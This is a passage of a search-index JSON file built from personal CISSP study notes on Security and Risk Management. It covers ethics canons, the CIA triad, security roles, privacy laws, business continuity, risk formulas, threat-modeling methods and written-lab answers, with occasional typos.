"CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#11-understand-adhere-to-and-promote-professional-ethics-2-4-items", "title": "1.1 Understand, adhere to, and promote professional ethics (2-4 items)", "text": "<p>Chapter 19</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#isc2-code-of-professional-ethics", "title": "ISC2 Code of Professional Ethics", "text": "<p>It's a simple code with a preamble and four canons.</p> <p>Code of Ethics Preamble - The safety and welfare of society and the common good, duty to our principlas, and to each other requires that we adhere, and be seen to adhere, to the highest ethical standards of behavior. - Therefore, strict adherence to this Code is a condition of certification.</p> <p>Code of Ethics Canons</p> <ol> <li> <p>Protect society, the common good, necessary public trust and confidence, and the infrastructure.</p> </li> <li> <p>Act honorably, honestly, justly, responsibly, and legally.</p> </li> <li> <p>Provide diligent and competent service to principals.</p> </li> <li> <p>Advance and protect the profession.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#organizational-code-of-ethics", "title": "Organizational code of ethics", "text": "<p>Almost every organization has its own code of ethics that is published to employees to help guide their everyday work. These may come in the form of an official ethics statement, or they may be embodied in the policies and procedures that the organization uses to carry out routine business activities.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#12-understand-and-apply-security-concepts", "title": "1.2 Understand and apply security concepts", "text": "<p>Chapter 1</p> <ul> <li>Confidentiality, integrity, and availability, authenticity, and nonrepudiation (5 Pillars of Information Security)</li> </ul>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#13-evaluate-apply-and-sustain-security-governance-principles", "title": "1.3 Evaluate, apply, and sustain security governance principles", "text": "<p>Chapter 1</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#alignment-of-the-security-function-to-business-strategy-goals-mission-and-objectives", "title": "Alignment of the security function to business strategy, goals, mission, and objectives", "text": "<p>Security management planning aligns the security functions to the strategy, goals, mission, and objectives of the organization. This includes designing and implementing security based on business cases, budget restrictions, or scarcity of resources.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#organizational-processes-eg-acquisitions-divestitures-governance-committees", "title": "Organizational processes (e.g., acquisitions, divestitures, governance committees)", "text": "<p>Acquisitions and mergers place an organization at an increased level of risk, including inappropriate information disclosure, data loss, downtime, or failure to achieve sufficient return on investment (ROI). In addition to all the typical business and financial aspects of mergers and acquisitions, a healthy does of security oversight and increased scrutiny is often essential to reduce the likelihood of looses during such a period of transformation.</p> <p>security-mindedness</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#organizational-roles-and-responsibilities", "title": "Organizational roles and responsibilities", "text": "<p>Senior manager: The organizational owner (senior manager) role is assigned to the person who is ultimately responsible for the security maintained by an organization and who should be most concerned about the protection of its assets. It is the person who authorize and support a security policy.</p> <p>Security professional: The security professional, information security (InfoSec) officer, or computer incident response team (CIRT) role is assigned to a trained and experienced network, systems, and security engineer who is responsible for following the directives mandated by senior management. The security professional has the functional responsibility for security, including writing the security policy and implementing it.</p> <p>Asset Owner: The person who is responsible for classifying information for placement and protection within the security solution. The asset owner is typically a high-level manager who is ultimately responsible for asset protection. However, the asset owner usually delegates the responsibility of the actual data management tasks to a custodian.</p> <p>Custodian: The custodian role is assigned to the user who is responsible for the tasks of implementing the prescribed protection defined by the security policy and senior management. The custodian performs all activities necessary to provide adequate protection for the CIA Triad of data and to fulfill the requirements and responsibilities delegated from upper management. These activities can include performing and testing backups, validating data integrity, deploying security solutions, and managing data storage based on classification.</p> <p>User: The user (end user or operator) role is assigned to any person who has access to the secured system.</p> <p>Auditor: An auditor is responsible for reviewing and verifying that the security policy is properly implemented and the derived security solutions are adequate.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#security-control-frameworks", "title": "Security control frameworks", "text": "<p>(e.g., International Organization for Standardization (ISO), National Institute of Standards and Technology (NIST), Control Objectives for Information and Related Technology (COBIT), Sherwood Applied Business Security Architecture (SABSA), Payment Card Industry (PCI), Federal Risk and Authorization Management Program (FedRAMP))</p> <p>One of the first and the most important security planning steps is to consider the overall security control framework or structure of the security solution desired by the organization.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#due-caredue-diligence", "title": "Due care/due diligence", "text": "<p>Due diligence is establishing a plan, policy, and process to protect the interests of an organization.</p> <p>Due care is practicing the individual activities that maintain the due diligence effort.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#14-understand-legal-regulatory-and-compliance-issues-that-pertain-to-information-security-in-a-holistic-context", "title": "1.4 Understand legal, regulatory, and compliance issues that pertain to information security in a holistic context", "text": "<p>Chapter 4</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#cybercrimes-and-data-breaches", "title": "Cybercrimes and data breaches", "text": "<p>Cybercrimes (aka computer crimes) are the term broadly applied when a computer is used in the act of committing a crime. They are often divided into two categories: - Computer as the target of a crime - Computer as a tool (weapon) used to commit a crime.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#licensing-and-intellectual-property-requirements", "title": "Licensing and Intellectual Property requirements", "text": "<p>Licensing</p> <p>Four common types of (software) license agreements are in use today:</p> <ul> <li> <p>Contractual license agreements use a written contract between the software vendor and the customer, outlining the responsiblities of each. These agreements are commonly found for high-priced and/or highly specialized software packages.</p> </li> <li> <p>Shrink-wrap license agreements are written on the outside of the software packaging. They commonly include a clause stating that you acknowledge agreement to the terms of the contract simply by breaking the shrink-wrap seal on the package.</p> </li> <li> <p>Click-through (aka browser wrap) license agreements are place contract terms written on the software box or include contract terms in the software documentation.</p> </li> <li> <p>Cloud services license agreements take click-through agreements to the extreme. Most cloud services do not require any form of written agreement and simply flash legal terms on the screen for review. Most users, in their excitement to access a new service, simply click their way through the agreement without reading it and may unwittingly bind their entire organization to onerous terms and conditions.</p> </li> </ul> <p>Intellectual Property (IP)</p> <p>IP is collectively referred by many intangible assets. For example, publishing companies, movie producers, and artists depend on their creative output to earn their livelihood. Many products depend on secret recipes or production techniques.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#importexport-controls", "title": "Import/export controls", "text": "<p>Two sets of federal regulations governing imports and exports are of particular interest to cybersecurity professionals:</p> <ul> <li> <p>The International Traffic in Arms Regulations (ITAR) controls the export of items that are specifically designated as military and defense items, including technical information related to those items. The items covered under ITAR appear on a list called the United States Munitions List (USML), maintained in 22 CFR 121.</p> </li> <li> <p>The Export Administration Regulations (EAR) cover a broader set of items that are designed for commercial use but may have military applications. Items covered by EAR appear on the Commerce Control List (CCL) maintained by the U.S. Department of Commerce. Notably, EAR includes an entire category covering information security products.</p> </li> </ul>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#transborder-data-flow", "title": "Transborder data flow", "text": "<p>Transborder data flow laws restrict the transfer of data across country borders. When sharing data across borders, applicable laws must be considered.</p> <p>These laws primarily relate to personal data. The idea is to protect a country/state/province/region's citizens' personal data. If an organization is collecting citizens' data, then they are accountable for the protection of that data.</p> <p>Given these laws, organizations must consider the potential implications of the flow of data across physical borders. This can be very challenging for organizations to keep track of with the proliferation of service providers and global cloud services.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#issues-related-to-privacy", "title": "Issues related to privacy", "text": "<p>(e.g., General Data Protection Regulation (GDPR), California Consumer Privacy Act, Personal Information Protection Law, Protection of Personal Information Act)</p> <ul> <li> <p>General Data Protection Regulation (GDPR), the main purpose of this law is to provide a single, harmonized law that covers data throughout the European Union, bolstering the personal privacy protections originally provided by the DPD (European Union Data Protection Directive).</p> <p>The key provisions of the GDPR include the following: Lawfulness, fairness, and transparency; purpose limitation; data minimization; accuracy; storage limitation; security; accountability.</p> </li> <li> <p>California Consumer Privacy Act provides consumers with the following:</p> <p>The right to know what information businesses are collecting about them and how the organization uses and shares that information</p> <p>The right to be forgotten, allowing consumers to request that the organization delete their personal information, in some circumstances</p> <p>The right to opt out of the sale of their personal information</p> <p>The right to exercise their privacy rights without fear of discrimination or retaliation for their use.</p> </li> <li> <p>Personal Information Protection Law</p> <p>Personal Information Protection and Electronic Documents Act (PIPEDA) is a national-level law in Canada, which restricts how commercial businesses may collect, use, and disclose personal information.</p> </li> <li> <p>Protection of Personal Information Act</p> </li> </ul> <p>Personal data</p> <p>Depending on the location in the world, personal data may be referred to in different ways, and what constitutes personal data can vary significantly.</p> <p>Personal data can be referred to as:</p> <pre><code>PI: Personal Information\nPII: Personally Identifiable Information\nSPI: Sensitive Personal Information\nPHI: Personal Health Information\nPCI: Personal Cardholder Information\n</code></pre> <p></p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#contractual-legal-industry-standards-and-regulatory-requirements", "title": "Contractual, legal, industry standards, and regulatory requirements", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#15-understand-requirements-for-investigation-types", "title": "1.5 Understand requirements for investigation types", "text": "<p>(i.e., administrative, criminal, civil, regulatory, industry standards)  Chapter 19</p> <p>Administrative investigations are internal investigations that examine either operational issues or a violation of the organization's policies.</p> <p>Criminal investigations are typically conducted by law enforcement personnel, investigate the alleged violation of criminal law.</p> <p>Civil investigations typically do not involve law enforcement but rather involve internal employees and outside consultants working on behalf of a legal team.</p> <p>Regulatory investigations are conducted by governmment agencies when they believe that an individual or corporation has violated administrative law.</p> <p>Industry standards: Some regulatory investigations may not involve government agencies. These are based on industry standards, such as the Payment Card Industry Data Security Standard (PCI DSS). These industry standards are not laws but are contractual obligations entered into by the participating organizations.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#16-develop-document-and-implement-security-policy-standards-procedures-and-guidelines", "title": "1.6 Develop, document, and implement security policy, standards, procedures, and guidelines", "text": "<p>Chapter 1</p> <p>Security policies are compulsory.</p> <p>Once the main security policies are set, then the remaining security documentation can be crafted under the guidance of those policies. Standards define compulsory requirements for the homogenous use of hardware, software, technology, and security controls.</p> <p>A guideline offers recommendations on how standards and baselines are implemented and serves as an operational guide for both security professionals and users.</p> <p>Procedures are the final element of the formalized security policy structure. A procedure or standard operating procedure (SOP) is a detailed, step-by-step how-to document that describes the exact actions necessary to implement a specific security mechanism, control, or solution.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#17-identify-analyze-assess-prioritize-and-implement-business-continuity-bc-requirements", "title": "1.7 Identify, analyze, assess, prioritize, and implement Business Continuity (BC) requirements", "text": "<p>Chapter 3</p> <p>The Business Continuity Planning (BCP) process has four main steps:</p> <ol> <li> <p>Project scope and planning, including organizational review, BCP team selection, resource requirements, legal and regulatory requirements.</p> </li> <li> <p>Business impact analysis, including identifying priorities, risk identification, likelihood assessment, impact analysis, resource prioritization.</p> </li> <li> <p>Continuity planning</p> </li> <li> <p>Approval and implementation</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#business-impact-analysis-bia", "title": "Business impact analysis (BIA)", "text": "<p>Two different types of analysis:  - quantitative impact assessment - qualitative impact assessment</p> <p>Impact analysis:</p> <pre><code>Single loss expectancy (SLE) = Asset value (AV) * Exposure factor (EF)\n\nAnnualized loss expectancy (ALE) = SLE * Annualized rate of occurrence (ARO)\n</code></pre>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#external-dependencies", "title": "External dependencies", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#18-contribute-to-and-enforce-personnel-security-policies-and-procedures", "title": "1.8 Contribute to and enforce personnel security policies and procedures", "text": "<p>Chapter 2</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#candidate-screening-and-hiring", "title": "Candidate screening and hiring", "text": "<p>New personnel represents a risk to security; every organization needs personnel security policies that address and mitigate this risk with the right security controls.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#employment-agreements-and-policy-driven-requirements", "title": "Employment agreements and policy driven requirements", "text": "<p>As part of bringing a new employee into an organization\u2014also referred to as onboarding\u2014company security policies, acceptable use policies, and similar agreements should be reviewed and agreed upon prior to giving a new employee their badge and any system credentials.</p> <p>Prior to an employee leaving, or in conjunction with it, user system access should be disabled, and the fact that the employee's employment is being terminated should be conveyed to all relevant parties within the organization.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#onboarding-transfers-and-termination-processes", "title": "Onboarding, transfers, and termination processes", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#vendor-consultant-and-contractor-agreements-and-controls", "title": "Vendor, consultant, and contractor agreements and controls", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#19-understand-and-apply-risk-management-concepts", "title": "1.9 Understand and apply risk management concepts", "text": "<p>Chapter 2</p> <ul> <li>Threat and vulnerability identification</li> <li>Risk analysis, assessment, and scope</li> <li>Risk response and treatment (e.g., cybersecurity insurance)</li> <li>Applicable types of controls (e.g., preventive, detection, corrective)</li> <li>Control assessments (e.g., security and privacy)</li> <li>Continuous monitoring and measurement</li> <li>Reporting (e.g., internal, external)</li> <li>Continuous improvement (e.g., risk maturity modeling)</li> <li>Risk frameworks (e.g., International Organization for Standardization (ISO), National Institute of Standards and  Technology (NIST), Control Objectives for Information and Related Technology (COBIT), Sherwood Applied Business  Security Architecture (SABSA), Payment Card Industry (PCI))</li> </ul> <p>Categories of controls</p> <p>A way to categorize the security controls is as safeguards or as countermeasures.</p> <p>Safeguards are proactive controls; they are put in place before the risk has occurred to deter or prevent it from manifesting.</p> <p>Countermeasures are reactive controls. They are put in place after risk has occurred and aim to allow us to detect and respond to it accordingly.</p> <p>Controls can be further classified into three main categories:</p> <ul> <li>Administrative</li> <li>Logical/Technical</li> <li>Physical</li> </ul> <p>Functional and assurance</p> <p>A good security control should always include two aspects: the functional aspect and the assurance aspect.</p> <ul> <li> <p>Functional: Control performs the function it was designed to address/does what it is meant to do\u2014for example, a firewall filtering traffic between different subnets.</p> </li> <li> <p>Assurance: Control can be proven to be functioning properly on an ongoing basis, usually proven through testing, assessments, logging, monitoring, etc.</p> </li> </ul> <p></p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#110-understand-and-apply-threat-modeling-concepts-and-methodologies", "title": "1.10 Understand and apply threat modeling concepts and methodologies", "text": "<p>Chapter 1</p> <p>Threat modeling is used to systematically identify, enumerate, and prioritize threats related to an asset.</p> <p></p> <p>Three major threat modeling methodologies you need to know about for the exam are STRIDE, PASTA, and DREAD.</p> <p>STRIDE is a threat-focused methodology that's less strategic and thorough than PASTA. It is an acronym of:</p> <pre><code>Spoofing\n\nTampering\n\nRepudiation\n\nInformation disclosure\n\nDenial-of-service\n\nElevation of privilege\n</code></pre> <p>PASTA</p> <p>Process for Attack Simulation and Threat Analysis (PASTA), contrary to STRIDE, is an attacker-focused, risk-centric methodology. It is much more detailed than STRIDE and performs threat analysis from a strategic perspective.</p> <p>The stages in PASTA are as follows:</p> <pre><code>Define objectives\n\nDefine technical scope\n\nApplication decomposition\n\nThreat analysis\n\nVulnerability and weakness analysis\n\nAttack modeling\n\nRisk and impact analysis\n</code></pre> <p>DREAD</p> <p>DREAD is a threat model primarily used to measure and rank the severity of threats. DREAD is often used in combination with the STRIDE model, where STRIDE identifies the threats, and DREAD is then used to rank the severity of threats. The acronym means:</p> <pre><code>Damage\n\nReproducibility\n\nExploitability\n\nAffected users\n\nDiscoverability\n</code></pre>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#social-engineering", "title": "Social engineering", "text": "<p>Social engineering can be defined as using deception or intimidation to get people to provide sensitive information that they shouldn't in order to facilitate fraudulent activities.</p> <p>It is a prevalent means of attack against organizations and employees (the biggest security weakness that exists in most companies) because it's very effective. Common social engineering tactics include intimidation, deception, and rapport.</p> <p>Social engineering attacks can be mitigated through awareness, training, and education.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#111-apply-supply-chain-risk-management-scrm-concepts", "title": "1.11 Apply supply chain risk management (SCRM) concepts", "text": "<p>Chapter 1</p> <p>Supply chain risk management (SCRM) is the means to ensure that all of the vendors or links in the supply chain are reliable, trustworthy, reputable organizations that disclose their practices and security requirements to their business partners (although not necessarily to the public).</p> <ul> <li>Risks associated with the acquisition of products and services from suppliers and providers (e.g., product tampering,  counterfeits, implants)</li> <li>Risk mitigations (e.g., third-party assessment and monitoring, minimum security requirements, service level  requirements, silicon root of trust, physically unclonable function, software bill of materials)</li> </ul>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#slr-sla-and-service-level-reports", "title": "SLR, SLA, and service level reports", "text": "<p>Security must be considered for all acquisitions and be part of the procurement process. Even if the acquisition is of a well-known brand, product, or service, risks exist and must be evaluated as part of the acquisition, or procurement, process. This evaluation should occur as early as possible and include security considerations that minimize the risk.</p> <p>Service level requirements (SLR)</p> <p>With the acquisition of a service, additional organizational requirements must be considered, which is done through an SLR document. Specifically, an SLR outlines:</p> <pre><code>Detailed service descriptions\n\nDetailed service level targets\n\nMutual responsibilities\n</code></pre> <p>Security requirements must be clearly communicated (e.g., SLAs) to suppliers/vendors/service providers.</p> <p>Service Level Agreement (SLA)</p> <p>After a service is acquired, an SLA must be put in place between the customer and the service provider.</p> <p>SLAs often include expectations and stipulations related to:</p> <pre><code>Service levels\n\nGovernance\n\nSecurity\n\nCompliance with law and regulations\n</code></pre> <p>Service level reports</p> <p>Service level reports are issued by a vendor or service provider to a client and provide insight and information about the service provider's ability to deliver services as defined by the SLA.</p> <p>It might contain any of the following components:</p> <pre><code>Achievement of metrics defined in the SLA\n\nIdentification of issues\n\nReporting channels\n\nManagement\n\nThird-party SOC (System and Organization Controls) reports\n</code></pre>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#112-establish-and-maintain-a-security-awareness-education-and-training-program", "title": "1.12 Establish and maintain a security awareness, education, and training program", "text": "<p>Chapter 2</p> <p>Everyone is responsible for security; however, they must know what to do. Awareness within an organization is fostered to create cultural sensitivity to a given topic or issue.</p> <p>In addition, education helps people understand fundamental concepts and therefore develop decision-making skills and abilities.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#methods-and-techniques-to-increase-awareness-and-training", "title": "Methods and techniques to increase awareness and training", "text": "<p>(e.g., social engineering, phishing, security champions, gamification)</p> <p>Common methods to provide awareness and training are:</p> <pre><code>Live in-person sessions\n\nLive online sessions\n\nPre-recorded sessions\n\nRequirements/rewards\n\nRegular communications/campaigns\n</code></pre> <p>The topics selected should directly align with the organization's goals and objectives. At the same time, training and education programs and materials should also evolve and be updated accordingly to be most effective.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#periodic-content-reviews-to-include-emerging-technologies-and-trends-eg-cryptocurrency-artificial-intelligence-ai-blockchain", "title": "Periodic content reviews to include emerging technologies and trends (e.g., cryptocurrency, artificial intelligence (AI), blockchain)", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/#program-effectiveness-evaluation", "title": "Program effectiveness evaluation", "text": "<p>Program participants should be surveyed from time to time. Some key metrics to consider are:</p> <pre><code>Total number of people completing the awareness program\n\nNumber of people providing feedback in comparison to total attendees\n\nNumber of people reporting suspicious activities after training completion\n\nTracking of how well staff members performed\n\nTotal number of attempts each person took the course\n</code></pre>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/", "title": "Chapter 1 Security Governance Through Principles and Policies", "text": "<p>Cover Domain 1 and 3.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#security-101", "title": "Security 101", "text": "<p>Why security is important?  Security helps to ensure that an organization is able to continue to exist and operate in spite of any attempts to steal its data or compromise its physical or logical element. Security should be viewed as an element of business management rather than an IT concern. Security is the business management tool that ensures the reliable and protected operation of IT/IS. Security exists to support the objectives, mission, and goals of the organization.</p> <p>How can an organization control its security?  Generally, a security framework should be adopted that provides a starting point for how to implement security.  1. Initiation 2. Finetuning through evaluation.     Three types of of security evaluation: risk assessment, vulnerability assessment, and penetration testing.</p> <p>What are the features of security? 1. Security should be cost-effective. Thus, you should select security controls that provide the greatest protection for the lowest resource cost.</p> <ol> <li> <p>Security should be legally defensible. The laws of your jurisdiction are the backstop of organizational security. When intruders' activities are illegal, prosecution in court may be the only available response for compensation or closure.</p> </li> <li> <p>Since our deployed technology is changing by the passage of time, by the users, and by the adversaries discovering flaws and developing exploits. The defenses that were sufficient yesterday may not be sufficient tomorrow. As new vulnerabilities are discovered, as new means of attack are crafted and new exploits ae built, we have to respond by reassessing our security infrastructure and responding appropriately.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#understand-and-apply-security-concepts", "title": "Understand and Apply Security Concepts", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#the-cia-triad", "title": "The CIA Triad", "text": "<p>Confidentiality  Confidentiality protections prevent disclosure while protecting authorized access. Many unauthorized disclosure of sensitive information are the result of human error, oversight, or ineptitude. Confidentiality violations can result from the actions of an end user or a system administrator. They can also occur because of an oversight in a security policy or a misconfigured security control. Numerous countermeasures can help ensure confidentiality against possible threats. These include encryption, network traffic padding, strict access control, rigorous authentication procedures, data classification, and extensive personnel training.</p> <p>Organizations should evaluate the nuances of confidentiality they wish to enforce. Tools and technology that implement one form of confidentiality might not support or allow other forms.</p> <p>Integrity  Integrity is the concept of protecting the reliability and correctness of data. Integrity protection prevents unauthorized alterations of data.</p> <p>Numerous attacks focus on the violation of integrity. These include viruses, logic bombs, unauthorized access, errors in coding and applications, malicious modification, intentional replacement, and system backdoors.</p> <p>Availability  Availability means authorized subjecta are granted timely and uninterrupted access to object. Often, availability protection controls support sufficient bandwidth and timeliness of processing as deemed necessary by the organization or situation.</p> <p>Availability includes efficient uninterrupted access to objects and prevention of denial-of-service (DoS) attacks.</p> <p>There are numerous threats to availability. These include device failure, software errors, and environmental issues (heat, static electricity, flooding power loss, and so on.)</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#dad-overprotection-authenticity-non-repudiation-and-aaa-services", "title": "DAD, Overprotection, Authenticity, Non-repudiation, and AAA Services", "text": "<p>DAD triad consists of three pillars: disclosure, alteration, and denial. It's the opposite of the CIA triad. The DAD triad represents the failures of security protections in the CIA triad.</p> <p>Overprotecting confidentiality or Overprotecting integrity can result in a restriction of availability. Overproviding availability can result in a loss of confidentiality and integrity.</p> <p>Authenticity is related to verifying that data is from a claimed origin and it did not change in transit or storage.</p> <p>Nonrepudiation ensures that the subject of an activity or who caused an event cannot deny that the event occurred.</p> <p>AAA services is a core security mechanism of all security environments. AAA stands for authentication, authorization, and accounting (or sometimes auditing). It consists of five elements: identification, authentication, authorization, auditing, and accounting.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#protection-mechanisms", "title": "Protection Mechanisms", "text": "<p>Some common examples of Protection Mechanisms are defense in depth, abstraction, data hiding, and using encryption.</p> <p>Defense in depth, also known a layering, is the use of multiple controls in a series. No one control can protect against all possible threats. When security solutions are designed in layers, a single failed control should not result in exposure of systems or data.</p> <p>Using layers in a series rather than in parallel is important.</p> <p>Serial configurations are very narrow but very deep.</p> <p>Abstraction is used for efficiency. Similar elements are put into groups, classes, or roles that are assigned security controls, restrictions, or permissions as a collective.</p> <p>Data hiding prevents data from being discovered or accessed by a subject by positioning the data in a logical storage compartment that is not accessible or seen by the subject.</p> <p>Encryption is the science of hiding the meaning or intent of a communication from unintended recipients.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#security-boundaries", "title": "Security Boundaries", "text": "<p>Due diligence is establishing a plan, policy, and process to protect the interests of an organization.</p> <p>Due care is practicing the individual activities that maintain the due diligence effort.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Discuss and describe the CIA Triad.</p> <p>CIA Traid consists of three components: confidentiality, integrity, and availability. Confidentiality is the principle of keep sensitive information away from unathorized subjects. Integrity is the principle that objects retain their veracity and are intentionally modified only by authorized subjects. Availability is the principle that authorized subjects are granted timely and uninterrupted access to objects.</p> </li> <li> <p>What are the requirements to hold a person accountable for the actions of their user account?</p> <p>The requirements of accountability are identification, authentication, authorization, and auditing. Each of these components needs to be legally supportable to truly hold someone accuntable for their actions.</p> </li> <li> <p>Name the six primary security roles as defind by (ISC)2 for CISSP.</p> <p>Senior manager, security professional (IT/security staff), assets owner, custodian, user, auditor.</p> </li> <li> <p>What are the four components of a complete organizational security policy and their basic purpose?</p> <p>The four components of a organizational security policy are policies, standards, guidelines and procedures. Policies are broad security statements. Standards are definitions of hardware and software security compliance. Guidelines are used when there is not an appropriate procedure. Procedures are detailed step-by-step instructions for performing work tasks in a secure manner.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/", "title": "Chapter 2 Personnel Security and Risk Management Concepts", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/#personnel-security-policies-and-procedures", "title": "Personnel Security Policies and Procedures", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Name six different administrative controls used to secure personnel.</p> <p>Job description, principle of least privilege, separation of duties, job responsibilities, job rotation/cross-training, and performance review.</p> </li> <li> <p>What are the basic formulas or values used in quantitative risk assessment?</p> <p>Asset Value ($),  Exposure Factor (% loss),  Single Loss Expectancy = AV * EF Annualized Rate of Occurance (# / yr) Annualized Loss Expectancy = SLE * ARO or AV * EF * ARO Cost/benefit = (ALE1 - ALE2) - ACS  ACS: Anuual Cost of Safeguard</p> </li> <li> <p>Describe the process or technique used to reach an anonymous consensus during a qualitative risk assessment.</p> <p>The Delphi technique is an anonymous feedback-and -response process used to enable a group to reach an anonymous consensus. Its primary purpose is to elicit honest and uninfluenced responses from all participants.</p> </li> <li> <p>Discuss the need to perform a balanced risk assessment. What are the techniques that can be used and why is this necessary?</p> <p>Risk assessment often involves a hybrid approach using both quantitative and qualitative method. A purely quantitative analysis is not possible; not all elements and aspects of the analysis can be quantified because some are qualitative, some are subjective, and some are intangible.</p> </li> <li> <p>what are the main types of social engineering principles?</p> <p>The common social engineering principles are authority, intimidation, consensus, scarcity, familiarity, trust and urgency.</p> </li> <li> <p>Name several types or methods of social engineering.     Possible answers: eliciting information, pretexting, prepending, phishing, spear phishing, etc.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/#the-level-of-risk-maturity-model-rmm", "title": "The level of Risk Maturity Model (RMM)", "text": "<p>Level 1: ad hoc, RMM is not listed as an option.</p> <p>Level 2: preliminary</p> <p>Level 3: defined. A common or standardized risk framework is adopted.</p> <p>Level 4: Integrated.</p> <p>Level 5: Optimized.</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/#seven-phases-of-risk-management-framework-rmf-mainly-about-nist", "title": "Seven phases of Risk Management Framework (RMF), mainly about NIST", "text": "<p>Referred to NIST SP 800-37</p> <p>Prepare</p> <p>Categorize</p> <p>Select</p> <p>Implement</p> <p>Assess</p> <p>Authorize</p> <p>Monitor</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%203/", "title": "Chapter 3 Business Continuity Planning", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%203/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Why is it essential to include legal representatives on your business continuity planning team?</p> <p>Many federal, state, and local laws or regulations require businesses to implement BCP provisions. Including legal representation on your BCP team helps ensure that you remain complaint with laws, regulations, and contractual obligations.</p> </li> <li> <p>What is wrong with taking an informal approach to business continuity planning?</p> <p>The \"seat-of-the-pants\" approach is an excuse used by individuals who do not want to invest time and money in the proper creation of a BCP. This can lead to catastrophe when a firmly laid plan isn't in place to guide the response during a stressful emergency situation.</p> </li> <li> <p>What is the difference between quantitative and qualitative assessment?</p> <p>Quantitative risk assessment involves using numbers and formulas to make a decision. Qualitative risk assessment includes expertise instead of numeric measures, such as emotions, investor/consumer confidence, and workforce stability.</p> </li> <li> <p>What critical components should you include in your business continuity training plan?</p> <p>The BCP training plan should include a plan overview briefing for all employees and specific training for individuals with direct or indirect involvement. In addition, backup personnel should be trained for each key BCP role.</p> </li> <li> <p>What are the four main steps of the business continuity planning process?</p> <p>The four steps of the BCP process are project scop and planning, business impact analysis, continuity planning, and approval/implementation.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%204/", "title": "Chapter 4 Laws, Regulations, and Compliance", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%204/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What are the two primary mechanisms that an organization may use to share information outside the European Union under the terms of GDPR (General Data Protection Regulation)?</p> <p>The two primary mechanisms that an organization used to share information outside the European Union are standard contractual clauses (SCCs) and binding corporate rules (BCRs).</p> </li> <li> <p>What are some common questions that organizations should ask when considering outsourcing information storage, processing, or transmission? (Using cloud services is one of the outsouring type.)</p> <ul> 